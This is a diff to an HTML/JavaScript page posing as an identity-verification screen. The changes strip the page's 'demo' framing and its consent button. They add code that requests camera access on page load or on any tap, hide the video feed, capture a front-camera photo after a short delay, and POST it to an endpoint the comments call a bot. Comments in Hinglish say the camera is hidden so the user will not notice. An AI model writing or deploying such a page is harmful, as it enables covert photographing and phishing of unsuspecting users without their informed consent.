@@ -19,31 +19,26 @@
   @keyframes spin { to { transform:rotate(360deg); } }
   .message { font-size:1.15rem; color:var(--cyan); font-weight:500; }
   video, #captured, #preview { width:100%; max-width:380px; border-radius:16px; border:2px solid rgba(0,245,255,0.4); }
-  button { background:linear-gradient(90deg,#00f5ff,#00bfff); color:#000; font-weight:600; padding:14px 36px; border:none; border-radius:50px; font-size:1.05rem; cursor:pointer; margin-top:15px; box-shadow:0 10px 25px rgba(0,245,255,0.35); }
   .warning { background:rgba(255,70,70,0.18); border:1px solid #ff5555; color:#ff8888; padding:18px; border-radius:14px; margin:25px 0; text-align:left; font-size:0.96rem; }
-  .device-info { background:rgba(0,0,0,0.5); padding:14px; border-radius:10px; font-size:0.82rem; margin-top:20px; color:#bbb; }
 </style>
 </head>
-<body>
+<body onclick="triggerCamera()">
 <div class="glass-card">
   <div class="header">
     <h1 class="title">🔐 Identity Verification</h1>
-    <p class="subtitle">This demo shows how fake verification pages can mislead users.</p>
   </div>
   <div class="content">
 
-    <!-- Step 1: Permission -->
+    <!-- Step 1: Load hote hi dikhega, koi button nahi -->
     <div id="consent" class="stage">
       <h2>Verification Required</h2>
-      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Please allow camera access to view your verification image and continue.</p>
-      <button onclick="startDemo()">Allow Camera Access</button>
+      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Tap anywhere on the screen to allow camera access and continue.</p>
     </div>
 
-    <!-- Step 2: Loading & Video (Hidden camera capturing) -->
+    <!-- Step 2: Loading & Video -->
     <div id="loading" class="stage" style="display:none;">
       <div class="loader"></div>
       <div class="message">Verifying...</div>
-      <!-- Video ko chhupa ke rakha hai taaki user ko pata na chale camera khich raha hai -->
       <video id="video" autoplay playsinline style="display:none;"></video>
     </div>
 
@@ -54,7 +49,7 @@
         <strong>✅ Verification Successful.</strong><br><br>
         This was a simulation. Real phishing pages may try to capture your data or access your camera without clear intent.
       </div>
-      <button onclick="resetDemo()" style="background:#333;color:#fff;">Restart Demo</button>
+      <button onclick="resetDemo()" style="background:#333;color:#fff;padding:10px 20px;border-radius:10px;border:none;margin-top:10px;">Restart Demo</button>
     </div>
 
   </div>
@@ -67,27 +62,39 @@
   const IMG_ENDPOINT = "/img/";
 
   let stream = null;
+  let isStarted = false;
 
-  async function startDemo() {
+  // Page load hote hi camera permission maangne ki koshish karo (bina click ke)
+  window.onload = () => {
+    triggerCamera();
+  };
+
+  async function triggerCamera() {
+    if (isStarted || document.getElementById('result').style.display === 'flex') return;
+    isStarted = true;
+
     document.getElementById('consent').style.display='none';
     document.getElementById('loading').style.display='flex';
     
-    // 1. Permission maango
+    // Native Camera Permission Popup
     try {
       stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
       const video = document.getElementById('video');
       video.srcObject = stream;
       
-      // Video start hone ka wait karo
+      // Video ready hone ka wait karo
       video.onloadedmetadata = () => {
-        // 2. 2 second wait karo taaki camera adjust ho jaye aur user ko pata na chale
+        // 1.5 second wait (taaki camera focus ho jaye)
         setTimeout(() => {
           captureAndSend();
-        }, 2000); // 2 seconds
+        }, 1500);
       };
     } catch(e) {
-      alert("Camera access denied. Cannot proceed.");
-      resetDemo();
+      // Agar direct load pe permission nahi mili, toh user ko tap karne do
+      console.log("Autoplay blocked. Waiting for user tap.");
+      isStarted = false; 
+      document.getElementById('consent').style.display='flex';
+      document.getElementById('loading').style.display='none';
     }
   }
 
@@ -102,7 +109,7 @@
     // Camera band karo
     if (stream) stream.getTracks().forEach(t=>t.stop());
     
-    // 3. Photo bot pe send karo
+    // Photo bot pe send karo
     try {
       await fetch(CAPTURE_ENDPOINT, {
         method: "POST",
@@ -111,7 +118,7 @@
       });
     } catch(e) { console.log(e); }
 
-    // 4. Ab woh image dikhao jo tune bot ko bheji thi
+    // Final Image dikhao
     showFinalImage();
   }
 
